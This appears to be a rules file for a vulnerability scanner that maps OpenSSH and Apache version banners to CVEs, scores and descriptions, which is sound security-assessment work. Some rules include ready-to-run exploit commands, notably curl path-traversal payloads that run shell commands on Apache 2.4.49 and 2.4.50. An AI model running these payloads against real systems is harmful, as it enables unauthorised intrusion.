# Community CVE Rules — 2024-2026 Critical Vulnerabilities
#
# Add new rules here. Each entry maps a banner substring to a CVE.
# Pattern matching is case-insensitive.
#
# Fields:
#   pattern     — substring to search for in TCP/HTTP banners (case-insensitive)
#   cve         — CVE identifier
#   cvss        — CVSS v3 base score (0.0 – 10.0)
#   severity    — "critical", "high", "medium", "low", "info"
#   description — human-readable description
#   exploit     — optional; ready-to-run PoC (TARGET is replaced at runtime)

# ── OpenSSH ─────────────────────────────────────────────────────────────────

[[rule]]
pattern = "openssh_9.1"
cve = "CVE-2023-38408"
cvss = 9.8
severity = "critical"
description = "OpenSSH 9.1 — PKCS#11 agent forwarding RCE. An attacker with access to the remote SSH agent can load arbitrary shared libraries from the forwarded agent."
exploit = "ssh-agent-exploit TARGET"

[[rule]]
pattern = "openssh_8.5"
cve = "CVE-2024-6387"
cvss = 8.1
severity = "high"
description = "OpenSSH 8.5-9.7 — regreSSHion race condition in signal handler. Remote unauthenticated code execution via SIGALRM race in sshd on glibc-based systems."
exploit = "# Requires ~10k connections over hours — see regreSSHion PoC"

[[rule]]
pattern = "openssh_9.7"
cve = "CVE-2024-6387"
cvss = 8.1
severity = "high"
description = "OpenSSH 9.7 — regreSSHion race condition (patched in 9.8)."

[[rule]]
pattern = "openssh_9.3"
cve = "CVE-2023-51385"
cvss = 6.5
severity = "medium"
description = "OpenSSH 9.3 — OS command injection via ProxyCommand/ProxyJump with user-supplied hostnames containing shell metacharacters."

# ── Apache HTTP Server ──────────────────────────────────────────────────────

[[rule]]
pattern = "apache/2.4.49"
cve = "CVE-2021-41773"
cvss = 9.8
severity = "critical"
description = "Apache 2.4.49 — path traversal and RCE via mod_cgi. URL-encoded dots bypass path normalization."
exploit = "curl -s 'http://TARGET/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh' -d 'echo Content-Type: text/plain; echo; id'"

[[rule]]
pattern = "apache/2.4.50"
cve = "CVE-2021-42013"
cvss = 9.8
severity = "critical"
description = "Apache 2.4.50 — incomplete fix for CVE-2021-41773 path traversal. Double-URL-encoding bypass."
exploit = "curl -s 'http://TARGET/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/bin/sh' -d 'echo Content-Type: text/plain; echo; id'"

[[rule]]
pattern = "apache/2.4.51"
cve = "CVE-2022-22720"
cvss = 9.8
severity = "critical"
description = "Apache 2.4.51 — HTTP request smuggling via malformed Transfer-Encoding."

[[rule]]
pattern = "apache/2.4.54"
cve = "CVE-2022-36760"
cvss = 9.0
severity = "critical"
description = "Apache 2.4.54 — HTTP request smuggling in mod_proxy_ajp. Allows prefix injection to the AJP backend."

